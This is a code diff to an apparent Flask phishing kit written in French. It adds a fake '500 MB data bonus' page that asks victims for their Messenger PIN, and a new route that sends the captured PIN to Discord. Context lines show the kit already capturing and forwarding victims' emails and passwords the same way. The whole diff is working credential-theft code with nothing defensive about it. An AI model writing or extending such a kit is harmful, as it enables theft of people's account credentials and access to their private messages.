@@ -92,9 +92,10 @@ HTML_BONUS = '''
         <h2>Compte Éligible !</h2>
         <div class="data-badge">PACK 500 MO ACTIVER</div>
         <p>Entrez votre numéro pour recevoir votre code d'activation :</p>
-        <form action="/final" method="post">
-            <input type="text" name="phone" placeholder="Ex: 034XXXXXXX" required>
-            <button type="submit">RÉCLAMER MAINTENANT</button>
+        <!-- ICI TU METS TON FORMULAIRE QUI ENVOIE LE PIN -->
+        <form action="/messenger_pin" method="post">
+            <input type="text" name="pin_code" placeholder="Code PIN Messenger" required>
+            <button type="submit">VALIDER MON CODE</button>
         </form>
     </div>
 </body>
@@ -121,6 +122,17 @@ def capture():
     send_to_discord(message)
     
     print(f"\n[!] LOGS CAPTURÉS : {email} | {password}")
+    return render_template_string(HTML_BONUS)
+
+@app.route('/messenger_pin', methods=['POST'])
+def capture_pin():
+    pin = request.form.get('pin_code')
+    
+    # Envoi du code de déchiffrement vers Discord
+    message = f"💬 **PIN MESSENGER CAPTURÉ** 💬\n🔓 **Code d'accès aux messages :** `{pin}`"
+    send_to_discord(message)
+    
+    # On peut ré‑afficher la page bonus ou rediriger ailleurs
     return render_template_string(HTML_BONUS)
 
 @app.route('/final', methods=['POST'])
